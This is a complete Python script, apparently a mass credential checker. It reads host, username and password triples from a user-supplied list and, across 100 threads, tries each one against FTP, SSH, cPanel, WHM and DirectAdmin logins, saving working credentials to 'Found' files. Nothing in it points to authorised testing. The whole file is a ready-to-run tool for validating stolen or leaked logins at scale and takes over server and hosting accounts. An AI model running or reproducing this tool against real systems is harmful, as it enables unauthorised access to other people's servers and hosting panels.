from __future__ import print_function
import ftplib
import paramiko
import concurrent.futures
import requests
from multiprocessing.pool import ThreadPool
import time



def check_ftp(line):
    try:
        # try to split that line to get host, username, and password
        try:
            host, username, password = line.split()
        except Exception as e:
            print("Error Format {} , Line Error: {}".format(line, e))
            return False

        ftp = ftplib.FTP()
        ftp.connect(host, timeout=10)
        ftp.login(username, password)
        ftp.quit()
        print(f"[ FTP SUCCESS ] {host}|{username}|{password}")
        with open('output/FTPFound.txt', 'a') as result:
            result.write(f"{host}|{username}|{password}\n")
    except Exception as e:
        print(f"[ FTP FAILED ] {host}|{username}|{password} - {e}")

def check_ssh(line):
    try:
        # try to split that line to get host, username, and password
        try:
            host, username, password = line.split()
        except Exception as e:
            print("Error Format {} , Line Error: {}".format(line, e))
            return False

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port=22, username=username, password=password, timeout=10)
            ssh.close()
            print(f"[+ SSH SUCCESS] {host}|{username}|{password}")
            with open('output/SSFound.txt', 'a') as result:
                result.write(f"{host}|{username}|{password}\n")
        except paramiko.AuthenticationException as auth_error:
            print(f"[ SSH FAILED ] {host}|{username}|{password} - Authentication Failed")
        except paramiko.SSHException as ssh_error:
            if "Error reading SSH protocol banner" in str(ssh_error):
                print(f"[ SSH FAILED ] {host} Error reading SSH protocol banner")
            else:
                print(f"[ SSH FAILED ] {host}|{username}|{password} - {ssh_error}")
        except Exception as e:
            print(f"[ SSH FAILED ] {host}|{username}|{password} - An unexpected error occurred")

    except Exception as e:
        print(f"[SSH FAILED] {host}|{username}|{password} - Failed")

def check_login(line, login_type):
    try:
        # try to split that line to get host, username, and password
        try:
            host, username, password = line.split()
        except Exception as e:
            print("Error Format {} , Line Error: {}".format(line, e))
            return False

        # add https:// to the beginning of the URL if it's not already there
        if not host.startswith('https://'):
            host = 'https://' + host

        if login_type == 'cpanel':
            host += ':2083/login/?login_only=1'
        elif login_type == 'whm':
            host += ':2087/login/?login_only=1'
        else:
            print("Invalid login type: {}".format(login_type))
            return False

        # build post parameters
        params = {'user': username, 'pass': password}

        # make request
        r = requests.post(host, params, timeout=10)

        if "status" in r.text and "security_token" in r.text:
            if login_type == 'cpanel':
                print("[CPANEL SUCCESS] {}|{}|{}".format(host, username, password))
                with open('output/CpanelFound.txt', 'a') as result:
                    result.write(f"{host}|{username}|{password}\n")
            elif login_type == 'whm':
                print("[WHM FAILED]  {}|{}|{}".format(host, username, password))
                with open('output/WHMFound.txt', 'a') as result:
                    result.write(f"{host}|{username}|{password}\n")

            return True

        else:
            print("[ {} ] {}|{}|{} - Failed > \"{}\"".format(login_type.upper(), host, username, password, r.reason))
            return False

    except requests.exceptions.ConnectTimeout as e:
        print("[ {} Not Found] {}".format(login_type.upper(), host))
        return False

    except requests.exceptions.RequestException as e:
        print("[ {} Not Found] {}".format(login_type.upper(), host))
        return False

def check_directadmin(line):
    try:
        # try to split that line to get host, username, and password
        try:
            host, username, password = line.split()
        except Exception as e:
            print("Error Format {} , Line Error: {}".format(line, e))
            return False

        # add http:// to the beginning of the URL if it's not already there
        if not host.startswith('http://'):
            host = 'https://' + host

        host += ':2222/api/login'

        # build post parameters
        payload = {'username': username, 'password': password}
        headers = {'Content-Type': 'application/json'}

        # make request
        try:
            r = requests.post(host, json=payload, headers=headers, timeout=10)
        except requests.exceptions.RequestException as e:
            print("[ DirectAdmin Not Found ] {}".format(host))
            return False

        if r.status_code == 200 and 'sessionID' in r.json():
            print("[DIRECTADMIN SUCCESS] {}|{}|{}".format(host, username, password))
            with open('output/DirectAdminFound.txt', 'a') as result:
                result.write(f"{host}|{username}|{password}\n")
            return True
        else:
            print("[DIRECTADMIN FAILED] {}|{}|{} - Failed > \"{}\"".format(host, username, password, r.reason))
            return False

    except Exception as e:
        print(f"[DIRECTADMIN FAILED] {host}|{username}|{password} - An unexpected error occurred")
        return False


def main():
    try:
        filename = input("Give Me Your List?: ")
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                list_data = [line.strip() for line in f.readlines()]
        except IOError:
            print("Failed to read file {}".format(filename))
            list_data = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for line in list_data:
                executor.submit(check_ftp, line)
                executor.submit(check_ssh, line)
                executor.submit(check_login, line, 'cpanel')
                executor.submit(check_login, line, 'whm')
                executor.submit(check_directadmin, line)

    except Exception as e:
        error_message = "An error occurred during program execution: {}".format(e)
        print(error_message)

if __name__ == '__main__':
    main()
